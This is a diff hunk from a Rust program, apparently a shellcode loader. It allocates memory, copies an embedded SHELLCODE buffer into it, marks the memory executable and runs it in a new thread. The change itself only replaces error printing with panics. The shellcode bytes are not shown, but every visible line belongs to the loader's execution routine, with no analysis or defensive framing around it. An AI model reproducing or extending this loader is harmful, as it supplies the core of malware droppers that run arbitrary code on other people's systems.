@@ -45,22 +45,19 @@ fn main() {
 
         let dest = virtual_alloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if dest.is_null() {
-            eprintln!("virtual_alloc failed!");
-            return;
+            panic!("virtual_alloc failed!");
         }
 
         rtl_copy_memory(dest, SHELLCODE.as_ptr().cast(), SIZE);
 
         let res = virtual_protect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("virtual_protect failed!");
-            return;
+            panic!("virtual_protect failed!");
         }
 
         let handle = create_thread(null(), 0, dest, 0, null_mut());
         if handle == 0 {
-            eprintln!("create_thread failed!");
-            return;
+            panic!("create_thread failed!");
         }
 
         wait_for_single_object(handle, WAIT_FAILED);
